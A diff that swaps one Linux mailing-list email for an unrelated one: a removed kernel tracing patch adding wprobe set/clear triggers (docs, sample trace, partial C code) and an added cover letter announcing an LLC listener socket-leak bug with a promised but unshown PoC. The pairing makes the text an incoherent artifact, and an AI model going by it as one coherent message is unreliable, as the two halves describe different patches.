@@ -1,1034 +1,937 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f178.google.com (mail-pl1-f178.google.com [209.85.214.178])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C74AD3ED3BA;
-	Mon,  7 Sep 2026 03:48:05 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7B5F43F1048
+	for <linux-kernel@vger.kernel.org>; Mon,  7 Sep 2026 03:48:09 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.178
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788752888; cv=none; b=d89570Gc4JErMkNESMr/izdYWYTG/J2hddjC7gBCFExnXBwBXFmZlGpZfyoYUwrsQ3DNzlI13jr/w7i0u+9bW7xpzP5sh6qQVFcVM2AsEztXg1/40sbt4SDkEtC+CMFn1OxWXsDrIxVBppTF25TrOCIfc54+50J5PsPAyil0N+k=
+	t=1788752892; cv=none; b=LOoLbiuo0MpF9tu9AdqmmlV4Ye8avedbMbZH8OUcwaaii4KHLL2gE2MDwFZdbRq2l4hWO6ZPrkZhqpqdE8NdhmtQUnvSlY1NESdo4HcjgV+cKKO/fM5id0qbDCMQppWx8PSMr/XslPl+RBoBcNSWmq2uEW2Puv3YKiNJVA1sTrY=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788752888; c=relaxed/simple;
-	bh=3AbUjjnQs1C5bwmhI9tbnLF8WNCOoG9AdrpU1AIYWqY=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=a2z5aQuX2fvC5nA95llzMmZPT3BMm9B775RAHRF8P0hDhQqJaU6CqMw8EGCe0DQm7+POyNvLwTxT4oA/EgCI0PGsW5M1y7LYIN6TGqK62Ep9WLzccPeyUrqwm4wJNjUDNnKxxvp5AdGnbwMzo3VSYohO5VsfWJ+DnbTpM3b6oWk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=AHZxy4lP; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1788752892; c=relaxed/simple;
+	bh=io5BHlXvSdOIbsINLvhj4q5xu9M3VHvQuhevZV12/tg=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=SM/1MHx7Uf1JoIEcq7U34XQsj3SGWHxUUMA4SVaFkTlswwpQnetaiFH9WLt5E8snaQUbQ5vq30+ZyXuyDLRv0H4V12xlM8tH7JM96sx9F5R2f2hpXwlZ64SPafx6fL+iNBdPWrnut1ZFxmbomNTYCnx1+zTN0m2wRPWnzfR8idg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=e0k9yENg; arc=none smtp.client-ip=209.85.214.178
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="AHZxy4lP"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id BC7E11F00A3A;
-	Mon,  7 Sep 2026 03:48:01 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1788752885;
-	bh=TFXOlHfwh9H8ULU948+ck91vvS8QoXCiKQGYI8w5BAk=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=AHZxy4lPhoNIeb57xMag6RLAIbikRIc8RveEe3RtQogINE7ZnQ2h9NVNSWsgEa9wm
-	 7G6f/s2dSS4tJjrZBG9Xz1PzixLF0Y2Qc5XsWYsrreaRb9cg6/BAONgs6pbMfO9C4u
-	 AIWWz9p78GQBeEq6px78ZcC8p5tFpnVLpdK9SSZxkeW96a9R65FLsX3ZDdcKtwC+Yq
-	 zQEWLp85NvsYDm7mNBRS+NJV21SEkA9ua41LmR09YTDCGQUaHjU/pk3vIRxYijJ+Tz
-	 H3irYGJxWI9bC3sNX+rgzcSpC7Y3SlpJ6CXa8wdmMyIxgyvU4G3dq802nBpggZ/6NP
-	 H8hKQUwJ099nw==
-From: "Masami Hiramatsu (Google)" <mhiramat@kernel.org>
-To: Steven Rostedt <rostedt@goodmis.org>,
-	Peter Zijlstra <peterz@infradead.org>,
-	Ingo Molnar <mingo@kernel.org>,
-	x86@kernel.org
-Cc: Jinchao Wang <wangjinchao600@gmail.com>,
-	Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
-	Masami Hiramatsu <mhiramat@kernel.org>,
-	Thomas Gleixner <tglx@linutronix.de>,
-	Borislav Petkov <bp@alien8.de>,
-	Dave Hansen <dave.hansen@linux.intel.com>,
-	"H . Peter Anvin" <hpa@zytor.com>,
-	Alexander Shishkin <alexander.shishkin@linux.intel.com>,
-	Ian Rogers <irogers@google.com>,
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="e0k9yENg"
+Received: by mail-pl1-f178.google.com with SMTP id d9443c01a7336-2d7195706f1so32886705ad.0
+        for <linux-kernel@vger.kernel.org>; Sun, 06 Sep 2026 20:48:09 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788752889; x=1789357689; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=l2F0YfxIA7oT76qfWgUtGIGO3XCeAJNOuVeYxDzlgEE=;
+        b=e0k9yENgY47LOkJd+IYtPzQjDL6paZ4fRHT0Pak0VjYWnfikUVzgn403QprVi327i0
+         YQqdvtuup7Y+ly9WNxlPyPoUMCflmWN+q2xeNYfGugvhyc3AeTAyAuRblYfmcm7rznZr
+         0eUvZJi6Q0akyADLTGvRXYfWn4V97ldzh9qm23v6cCbMXtki7PVFyXJRFM7uQbtuLi94
+         MCixpy83vEGubLSegCf7HggLknu0tH9DEggTFAs/otM7SHXs29lDnHH+kg78XT7D4gZ/
+         frgcTY24z6hVfLI0leGIeTMt1xW0Zp47mrNRC2a0lyciHPIL1A2K1PgeInVHG6yOdK8+
+         eAHQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788752889; x=1789357689;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=l2F0YfxIA7oT76qfWgUtGIGO3XCeAJNOuVeYxDzlgEE=;
+        b=WrMKs7m9vX90Fbqpa6UFv241VD2p/AE82jG6ltZf8jHVyGrHQsDk0xAORiBkvPtkic
+         K6K6oj0tX5xwASC/n6wMVYkTNTjKRedfXvojbb9cLT9NHjCYdPbWh/YASnd5vKxbMjkI
+         Sd3kq4wJv+qf4LK2Xs8qvzzgDhhnahkLapWuNfEeRKeYykoORnYX5Zitk0q2yxOcAYyq
+         efvUXCd1N9GwsQROXaHs3zEbQMcXdUIUUe+v4McXtwaIxHAyp0q7SNKOXW0lJmv5MRWM
+         ZBEumsg8THF4olZwRnHwCRHg7SBgr/lGA4YOKd/71Q6LsSE51SHyIFOPCsS2RpVMkqB6
+         ZL/A==
+X-Forwarded-Encrypted: i=1; AKwUvBwAeT6IxWrf/DZDP9yGHyxMSVm5pyBff8DlnEPDx6tGvY0IoB/nush4nQZ9BX80PZyaLsPwuEXvr36fcP4=@vger.kernel.org
+X-Gm-Message-State: AFuF++kt3amvodwk8I6a0/yzWNPVksXRNo6m/kl3WTYFtZfWuKE3/Aar
+	q0soU6NuoejXtJhnWfig5PLAAIK1xCpwxzL0hu1WZzE6K6KCBzeZo7Sz+Cr8jTGjm+KC
+X-Gm-Gg: AYBFou1tSJuUFehsO5zU3gzUfw2m56/UTNybHDdKEoz4+szlhOYabOOVg4llstYVJqA
+	dkccPpZdXWhtFzKGv2cLcRV4AsV4V+Pn/ehe4RMzf/O5hec327ohB4RKah2mU07+y5hWURttq2q
+	lh+aZgyLtuO6z1nfSYSLe4mJu7fE2XXipqRqkw0a7pfpbQd2w+98aMEaCRamVtE9AB4yI/L3Vdf
+	MF0rMdwVnz/3F0QmZccSHOctBsnOz+xwVQiR6CrCoYjrbpU37AjCCvKfP21NIAmqK+YZ6cNhhK7
+	GxxmorSVz4UdHsRp6vhkXssnPfZUZS6o3VeITaQ6ILH+ev1CtXcgRhLjMgmR7LdwzwMHqiHOsEW
+	FBJBvToAxxZ28pAWPJ+OU/gRn7q8kbSytCOAY40AYWC0tjdU+/nYi8MGw1m6JsAVO6yT2RCSpkm
+	kxkcnjlDKV+mJ1lEHVifyHJDoZfeCmSuIqmcuVyGyAZYfSYX0RA38tLRf9QKlR761PCbdbrC4SO
+	XHDinljCf0S4kAepBY=
+X-Received: by 2002:a17:903:1b4e:b0:2db:18fe:bb08 with SMTP id d9443c01a7336-2db18fec95amr301594545ad.10.1788752887922;
+        Sun, 06 Sep 2026 20:48:07 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2db1484105fsm37841105ad.10.2026.09.06.20.47.56
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 06 Sep 2026 20:48:06 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: "David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Kees Cook <kees@kernel.org>,
 	linux-kernel@vger.kernel.org,
-	linux-trace-kernel@vger.kernel.org,
-	linux-doc@vger.kernel.org,
-	linux-perf-users@vger.kernel.org
-Subject: [PATCH v15 09/12] tracing/wprobe: Add set_wprobe and clear_wprobe event triggers
-Date: Mon,  7 Sep 2026 12:47:59 +0900
-Message-ID: <178875287944.93794.8914114071047199197.stgit@devnote2>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <178875277830.93794.14247844688761142429.stgit@devnote2>
-References: <178875277830.93794.14247844688761142429.stgit@devnote2>
-User-Agent: StGit/0.19
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net v8 0/1] llc: fix listener child socket leaks before passive open completes
+Date: Mon,  7 Sep 2026 03:47:50 +0000
+Message-ID: <cover.1788707641.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: 8bit
 
-From: Masami Hiramatsu (Google) <mhiramat@kernel.org>
+Hi Linux kernel maintainers,
 
-Add set_wprobe and clear_wprobe event triggers to dynamically attach
-and detach hardware breakpoint address monitoring based on event field
-contents.
+We found and validated an issue in net/llc/llc_conn.c. The reproducer needs
+CAP_NET_RAW and CAP_NET_ADMIN in init_net.
+We've tested it, and it should not affect any other functionality.
 
-Link: https://lore.kernel.org/all/59637b96946653393a7ad3c7de094094796b39c2.1785067572.git.wangjinchao600@gmail.com/
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Assisted-by: Antigravity:gemini-3.8-flash
-Signed-off-by: Masami Hiramatsu (Google) <mhiramat@kernel.org>
----
-Changes in v15:
- - Use trace_wprobe_is_valid_addr() in wprobe_trigger() to validate
-   address and natural alignment for wprobe length.
- - Record SMP local update failures in tw->missed counter.
- - Expose missed event count as a trailing comment in trigger file.
- - Add set_wprobe and clear_wprobe triggers to readme_msg in trace.c.
- - Fix line length exceeding 100 columns in wprobe_trigger_log_err macro.
- - Initialize irq_work and work structs immediately after allocation
-   in alloc_trace_wprobe() and check tw->work.func in free_trace_wprobe()
-   to prevent WARN_ON(!work->func) on early allocation failure.
-Changes in v14:
- - Allow '-1' as a dummy address in parse_address_spec() to set initial
-   address to WPROBE_DEFAULT_CLEAR_ADDRESS for trigger-only wprobes.
- - In trace_wprobe_show(), format WPROBE_DEFAULT_CLEAR_ADDRESS as '-1'.
- - Update documentation and examples to use '-1' instead of '0'.
- - Skip field parsing in clear_wprobe if parameter is a count keyword.
- - Set tw->addr to WPROBE_DEFAULT_CLEAR_ADDRESS before soft-enabling event
-   and roll back on failure.
- - Fix memory and refcount leak of trigger_data/wprobe_data on error path.
-Changes in v13:
- - Align WPROBE_DEFAULT_CLEAR_ADDRESS to 8 bytes using dedicated u64.
- - Remove manual count decrement to rely on core event_trigger_count().
- - Parse optional FIELD argument in clear_wprobe command.
- - Fix trigger reference count leak and error cleanup in command parsing.
- - Update document to add [:COUNT] to trigger syntax and fix adjust forms.
- - Add notes about the exclusive trigger setting behavior.
- - Remove unused dyn_event_ops_mutex.
-Changes in v12:
- - Decrement trigger data->count only when watchpoint state is actually
-   changed.
- - Remove dyn_event_ops_mutex to fix lockdep circular dependency deadlock.
- - Add event_trigger_init() call to prevent premature freeing of trigger_data.
----
- Documentation/trace/wprobetrace.rst |  107 ++++++
- include/linux/trace_events.h        |    1 
- kernel/trace/Kconfig                |   10 +
- kernel/trace/trace.c                |    4 
- kernel/trace/trace.h                |    1 
- kernel/trace/trace_events_trigger.c |    2 
- kernel/trace/trace_probe.c          |    2 
- kernel/trace/trace_probe.h          |    9 -
- kernel/trace/trace_wprobe.c         |  609 +++++++++++++++++++++++++++++++++++
- 9 files changed, 742 insertions(+), 3 deletions(-)
+---- details below ----
 
-diff --git a/Documentation/trace/wprobetrace.rst b/Documentation/trace/wprobetrace.rst
-index 31cc68b464e9..df8985283312 100644
---- a/Documentation/trace/wprobetrace.rst
-+++ b/Documentation/trace/wprobetrace.rst
-@@ -76,3 +76,110 @@ Wprobe event does not disable itself even if the module is unloaded.
- For example, if you add a wprobe event on a module variable, and then
- unload the module, the wprobe event will still be enabled. This is for
- watching the address is used unexpectedly after the module is unloaded.
-+
-+Combination with trigger action
-+-------------------------------
-+The event trigger action can extend the utilization of this wprobe.
-+
-+- set_wprobe:WPEVENT:FIELD[+|-ADJUST][:COUNT]
-+- clear_wprobe:WPEVENT[:FIELD[+|-ADJUST][:COUNT]]
-+
-+Set these triggers to the target event, then the WPROBE event will be
-+setup to trace the memory access at FIELD[+|-ADJUST] address.
-+When clear_wprobe is hit, if FIELD is NOT specified, the WPEVENT is
-+forcibly cleared. If FIELD[+|-ADJUST] is set, it clears WPEVENT only
-+if its watching address is the same as the FIELD[+|-ADJUST] value.
-+If COUNT is specified, it will set/clear WPEVENT only if it hits COUNT
-+times.
-+
-+Notes:
-+- set_wprobe only works on the wprobe which is NOT set a valid address yet,
-+  and it must be enabled after the trigger is set.
-+- clear_wprobe only works on the wprobe which is set a valid address, and it
-+  will be soft-disabled after the trigger is cleared.
-+- Therefore, if a trigger sets/clears a wprobe, other/same trigger events
-+  will not work (on the same event) while the wprobe is set.
-+
-+The set_wprobe trigger does not change the type and length, these
-+must be set when creating a new wprobe.
-+
-+The WPROBE event must be disabled when setting the new trigger
-+and it will be busy afterwards. Recommended usage is to add a new
-+wprobe at invalid dummy address (-1) and keep disabled.
-+
-+Wprobe triggers only support target addresses in kernel memory. If a
-+set_wprobe trigger evaluates to a user-space memory address or NULL
-+pointer, the trigger action ignores the update and skips setting the
-+watchpoint.
-+
-+Wprobe triggers are not supported on kprobe_events, because kprobes
-+themselves can use software breakpoints which conflicts with wprobe
-+operation.
-+
-+
-+For example, trace the first 8 bytes of the dentry data structure passed
-+to do_truncate() until it is deleted by dentry_kill().
-+(Note: all tracefs setup uses '>>' so that it does not kick do_truncate())
-+::
-+
-+  # echo 'w:watch rw@-1:8 address=$addr value=+0($addr)' >> dynamic_events
-+  # echo 'f:truncate do_truncate dentry=$arg2' >> dynamic_events
-+  # echo 'set_wprobe:watch:dentry' >> events/fprobes/truncate/trigger
-+  # echo 'f:dentry_kill dentry_kill dentry=$arg1' >> dynamic_events
-+  # echo 'clear_wprobe:watch:dentry' >> events/fprobes/dentry_kill/trigger
-+  # echo 1 >> events/fprobes/truncate/enable
-+  # echo 1 >> events/fprobes/dentry_kill/enable
-+
-+  # echo aaa > /tmp/hoge
-+  # echo bbb > /tmp/hoge
-+  # echo ccc > /tmp/hoge
-+  # rm /tmp/hoge
-+
-+Then, the trace data will show::
-+
-+ # tracer: nop
-+ #
-+ # entries-in-buffer/entries-written: 32/32   #P:8
-+ #
-+ #                                _-----=> irqs-off/BH-disabled
-+ #                               / _----=> need-resched
-+ #                              | / _---=> hardirq/softirq
-+ #                              || / _--=> preempt-depth
-+ #                              ||| / _-=> migrate-disable
-+ #                              |||| /     delay
-+ #           TASK-PID     CPU#  |||||  TIMESTAMP  FUNCTION
-+ #              | |         |   |||||     |         |
-+               sh-107     [004] ...1.     9.990418: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004ad6618
-+               sh-107     [004] ...1.     9.990914: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004b3de78
-+               sh-107     [004] ...1.     9.993175: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880049ddd40
-+               sh-107     [004] .....     9.995198: truncate: (do_truncate+0x4/0x120) dentry=0xffff8880048083a8
-+               sh-107     [004] ...1.     9.995389: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880049db998
-+               sh-107     [004] ..Zff     9.997503: watch: (lookup_fast+0xaa/0x150) address=0xffff8880048083a8 value=0x8200080
-+               sh-107     [004] ..Zff     9.997509: watch: (path_openat+0x211/0xda0) address=0xffff8880048083a8 value=0x8200080
-+               sh-107     [004] ..Zff     9.997514: watch: (path_openat+0xa56/0xda0) address=0xffff8880048083a8 value=0x8200080
-+               sh-107     [004] ..Zff     9.997518: watch: (path_openat+0xae2/0xda0) address=0xffff8880048083a8 value=0x8200080
-+               sh-107     [004] .....     9.997521: truncate: (do_truncate+0x4/0x120) dentry=0xffff8880048083a8
-+               sh-107     [004] ...1.     9.997582: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004808270
-+               sh-107     [004] ...1.     9.999365: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880049db728
-+               sh-107     [004] ...1.     9.999388: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004b1c000
-+               rm-113     [005] ..Zff    10.000965: watch: (lookup_fast+0xaa/0x150) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.000971: watch: (path_lookupat+0x97/0x1e0) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.000984: watch: (lookup_fast+0xaa/0x150) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.000988: watch: (path_lookupat+0x97/0x1e0) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.001010: watch: (lookup_one_qstr_excl+0x28/0x140) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.001014: watch: (lookup_one_qstr_excl+0xd1/0x140) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.001018: watch: (may_delete_dentry+0x1c/0x200) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.001021: watch: (may_delete_dentry+0x195/0x200) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] ..Zff    10.001031: watch: (vfs_unlink+0x5e/0x260) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] d.Z..    10.001067: watch: (d_make_discardable+0x1b/0x40) address=0xffff8880048083a8 value=0x8200080
-+               rm-113     [005] d.Z..    10.001071: watch: (d_make_discardable+0x29/0x40) address=0xffff8880048083a8 value=0x200080
-+               rm-113     [005] ...1.    10.001072: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880048083a8
-+               rm-113     [005] ...1.    10.001218: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880048083a8
-+               sh-107     [004] ...1.    10.001416: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880049db110
-+               sh-107     [004] ...1.    10.001444: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff8880049db248
-+               sh-107     [004] ...1.    10.001500: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004ad6618
-+               sh-107     [004] ...1.    10.002067: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004b41e78
-+               sh-107     [004] ...1.    10.904920: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004b41e78
-+               sh-107     [004] ...1.    10.905129: dentry_kill: (dentry_kill+0x0/0x2c0) dentry=0xffff888004ad6618
-+
-+You can see the watch event is correctly configured on the dentry.
-diff --git a/include/linux/trace_events.h b/include/linux/trace_events.h
-index 43ffd9a76d88..f81a5308c116 100644
---- a/include/linux/trace_events.h
-+++ b/include/linux/trace_events.h
-@@ -738,6 +738,7 @@ enum event_trigger_type {
- 	ETT_EVENT_HIST		= (1 << 4),
- 	ETT_HIST_ENABLE		= (1 << 5),
- 	ETT_EVENT_EPROBE	= (1 << 6),
-+	ETT_EVENT_WPROBE	= (1 << 7),
- };
- 
- extern int filter_match_preds(struct event_filter *filter, void *rec);
-diff --git a/kernel/trace/Kconfig b/kernel/trace/Kconfig
-index d9b6fa5c35d9..5fd8ed63c516 100644
---- a/kernel/trace/Kconfig
-+++ b/kernel/trace/Kconfig
-@@ -876,6 +876,16 @@ config WPROBE_EVENTS
- 	  Those events can be inserted wherever hardware breakpoints can be
- 	  set, and record accessed memory address and values.
- 
-+config WPROBE_TRIGGERS
-+	depends on WPROBE_EVENTS
-+	depends on HAVE_MODIFY_LOCAL_HW_BREAKPOINT_ADDR
-+	bool
-+	default y
-+	help
-+	  This adds an event trigger which will set the wprobe on a specific
-+	  field of an event. This allows user to trace the memory access of
-+	  an address pointed by the event field.
-+
- config BPF_EVENTS
- 	depends on BPF_SYSCALL
- 	depends on (KPROBE_EVENTS || UPROBE_EVENTS) && PERF_EVENTS
-diff --git a/kernel/trace/trace.c b/kernel/trace/trace.c
-index 40c3e1543f6e..0a38eda359c1 100644
---- a/kernel/trace/trace.c
-+++ b/kernel/trace/trace.c
-@@ -4366,6 +4366,10 @@ static const char readme_msg[] =
- 	"\t   trigger: traceon, traceoff\n"
- 	"\t            enable_event:<system>:<event>\n"
- 	"\t            disable_event:<system>:<event>\n"
-+#ifdef CONFIG_WPROBE_TRIGGERS
-+	"\t            set_wprobe:<wprobe-event>:<field>[+|-<offset>]\n"
-+	"\t            clear_wprobe:<wprobe-event>[:<field>[+|-<offset>]]\n"
-+#endif
- #ifdef CONFIG_HIST_TRIGGERS
- 	"\t            enable_hist:<system>:<event>\n"
- 	"\t            disable_hist:<system>:<event>\n"
-diff --git a/kernel/trace/trace.h b/kernel/trace/trace.h
-index 18588c550a98..a61f840b18bd 100644
---- a/kernel/trace/trace.h
-+++ b/kernel/trace/trace.h
-@@ -1983,6 +1983,7 @@ trigger_data_alloc(struct event_command *cmd_ops, char *cmd, char *param,
- 		   void *private_data);
- extern void trigger_data_free(struct event_trigger_data *data);
- extern int event_trigger_init(struct event_trigger_data *data);
-+extern void event_trigger_free(struct event_trigger_data *data);
- extern int trace_event_trigger_enable_disable(struct trace_event_file *file,
- 					      int trigger_enable);
- extern void update_cond_flag(struct trace_event_file *file);
-diff --git a/kernel/trace/trace_events_trigger.c b/kernel/trace/trace_events_trigger.c
-index 149300cc5e8a..120e6ec634b7 100644
---- a/kernel/trace/trace_events_trigger.c
-+++ b/kernel/trace/trace_events_trigger.c
-@@ -589,7 +589,7 @@ int event_trigger_init(struct event_trigger_data *data)
-  * Usually used directly as the @free method in event trigger
-  * implementations.
-  */
--static void
-+void
- event_trigger_free(struct event_trigger_data *data)
- {
- 	if (WARN_ON_ONCE(data->ref <= 0))
-diff --git a/kernel/trace/trace_probe.c b/kernel/trace/trace_probe.c
-index 64e7e363e8e2..77266e042418 100644
---- a/kernel/trace/trace_probe.c
-+++ b/kernel/trace/trace_probe.c
-@@ -20,7 +20,7 @@
- #undef C
- #define C(a, b)		b
- 
--static const char *trace_probe_err_text[] = { ERRORS };
-+const char *trace_probe_err_text[] = { ERRORS };
- 
- static const char *reserved_field_names[] = {
- 	"common_type",
-diff --git a/kernel/trace/trace_probe.h b/kernel/trace/trace_probe.h
-index f20cafb87cc6..1e11077ead67 100644
---- a/kernel/trace/trace_probe.h
-+++ b/kernel/trace/trace_probe.h
-@@ -636,7 +636,12 @@ extern int traceprobe_define_arg_fields(struct trace_event_call *event_call,
- 	C(TYPECAST_SYM_OFFSET,	"@SYM+/-OFFSET with typecast needs parentheses"),	\
- 	C(USED_ARG_NAME,	"This argument name is already used"),		\
- 	C(WPROBE_NO_MAXACT,	"Watchpoint probe does not support maxactive"),	\
--	C(WPROBE_NO_SIBLING,	"Watchpoint probe does not support sibling probes"),
-+	C(WPROBE_NO_SIBLING,	"Watchpoint probe does not support sibling probes"), \
-+	C(WPROBE_ON_KPROBE,	"Wprobe trigger is not supported on kprobe event"), \
-+	C(WPROBE_NOT_FOUND,	"Target wprobe event is not found"),		\
-+	C(WPROBE_BUSY,		"Target wprobe event is already enabled"),	\
-+	C(WPROBE_NEED_FIELD,	"Wprobe trigger requires a target field"),	\
-+	C(WPROBE_BAD_FIELD,	"Target field must be pointer size"),
- 
- #undef C
- #define C(a, b)		TP_ERR_##a
-@@ -660,6 +665,8 @@ void __trace_probe_log_err(int offset, int err);
- 
- DEFINE_FREE(trace_probe_log_clear, const char *, if (_T) trace_probe_log_clear())
- 
-+extern const char *trace_probe_err_text[];
-+
- #define trace_probe_log_err(offs, err)	\
- 	__trace_probe_log_err(offs, TP_ERR_##err)
- 
-diff --git a/kernel/trace/trace_wprobe.c b/kernel/trace/trace_wprobe.c
-index 9c6100b63e8d..3cf8786ef0ee 100644
---- a/kernel/trace/trace_wprobe.c
-+++ b/kernel/trace/trace_wprobe.c
-@@ -6,7 +6,9 @@
-  */
- #define pr_fmt(fmt)	"trace_wprobe: " fmt
- 
-+#include <linux/atomic.h>
- #include <linux/compiler.h>
-+#include <linux/errno.h>
- #include <linux/hw_breakpoint.h>
- #include <linux/kallsyms.h>
- #include <linux/list.h>
-@@ -15,11 +17,16 @@
- #include <linux/perf_event.h>
- #include <linux/rculist.h>
- #include <linux/security.h>
-+#include <linux/spinlock.h>
- #include <linux/tracepoint.h>
- #include <linux/uaccess.h>
-+#include <linux/workqueue.h>
-+#include <linux/irq_work.h>
-+#include <linux/preempt.h>
- 
- #include <asm/ptrace.h>
- 
-+#include "trace.h"
- #include "trace_dynevent.h"
- #include "trace_probe.h"
- #include "trace_probe_kernel.h"
-@@ -51,6 +58,17 @@ struct trace_wprobe {
- 	int			len;
- 	int			type;
- 	const char		*symbol;
-+	raw_spinlock_t		lock;
-+	struct irq_work		irq_work;
-+	struct work_struct	work;
-+	atomic_t		missed;
-+	/*
-+	 * work_pending is set to 1 before irq_work_queue() and cleared to 0
-+	 * after wprobe_work_func() finishes on_each_cpu(). This prevents a
-+	 * new trigger from overwriting tw->addr while the work is propagating
-+	 * the old address to per-CPU debug registers via IPI.
-+	 */
-+	atomic_t		work_pending;
- 	struct trace_probe	tp;
- };
- 
-@@ -199,14 +217,65 @@ static int __register_trace_wprobe(struct trace_wprobe *tw)
- static void __unregister_trace_wprobe(struct trace_wprobe *tw)
- {
- 	if (tw->bp_event) {
-+		irq_work_sync(&tw->irq_work);
-+		cancel_work_sync(&tw->work);
- 		unregister_wide_hw_breakpoint(tw->bp_event);
- 		tw->bp_event = NULL;
- 	}
- }
- 
-+static int trace_wprobe_update_local(struct trace_wprobe *tw, unsigned long addr)
-+{
-+	struct perf_event * __percpu *pevent;
-+	struct perf_event *bp;
-+
-+	pevent = tw->bp_event;
-+	if (!pevent)
-+		return -EINVAL;
-+
-+	bp = *this_cpu_ptr(pevent);
-+	if (!bp)
-+		return -EINVAL;
-+
-+	return modify_local_hw_breakpoint_addr(bp, addr);
-+}
-+
-+static void wprobe_smp_update_func(void *info)
-+{
-+	struct trace_wprobe *tw = info;
-+	unsigned long addr = READ_ONCE(tw->addr);
-+
-+	if (trace_wprobe_update_local(tw, addr))
-+		atomic_inc(&tw->missed);
-+}
-+
-+static void wprobe_work_func(struct work_struct *work)
-+{
-+	struct trace_wprobe *tw = container_of(work, struct trace_wprobe, work);
-+
-+	on_each_cpu(wprobe_smp_update_func, tw, true);
-+	/*
-+	 * Clear work_pending after all CPUs have updated their local debug
-+	 * registers.  A new trigger may now update tw->addr and queue a new
-+	 * irq_work.
